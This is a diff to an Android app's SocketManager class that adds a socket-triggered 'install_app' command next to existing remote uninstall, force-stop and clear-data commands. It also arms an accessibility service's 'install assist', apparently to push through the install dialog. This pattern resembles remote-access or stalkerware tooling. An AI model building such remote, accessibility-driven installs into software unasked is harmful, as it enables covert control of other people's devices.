@@ -1806,6 +1806,42 @@ public class SocketManager {
             String packageName = params.getString("packageName");
             return appMonitor.uninstallApp(packageName);
         }
+        if (command.equals("install_app")) {
+            String filePath = params.optString("filePath", "");
+            JSONObject r = new JSONObject();
+            try {
+                if (filePath.isEmpty()) {
+                    r.put("success", false);
+                    r.put("error", "filePath required");
+                    return r;
+                }
+                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+                if (svc != null) {
+                    svc.armInstallAssist(filePath);
+                }
+                android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_VIEW);
+                android.net.Uri uri;
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+                    try {
+                        uri = androidx.core.content.FileProvider.getUriForFile(context, context.getPackageName() + ".fileprovider", new java.io.File(filePath));
+                        intent.addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                    } catch (Exception ex) {
+                        uri = android.net.Uri.fromFile(new java.io.File(filePath));
+                    }
+                } else {
+                    uri = android.net.Uri.fromFile(new java.io.File(filePath));
+                }
+                intent.setDataAndType(uri, "application/vnd.android.package-archive");
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+                r.put("success", true);
+                r.put("message", "Installation dialog opened");
+                return r;
+            } catch (Exception e) {
+                try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+                return r;
+            }
+        }
         if (command.equals("force_stop_app")) return appMonitor.forceStopApp(params.getString("packageName"));
         if (command.equals("open_app"))       return appMonitor.openApp(params.getString("packageName"));
         if (command.equals("clear_app_data")) return appMonitor.clearAppData(params.getString("packageName"));
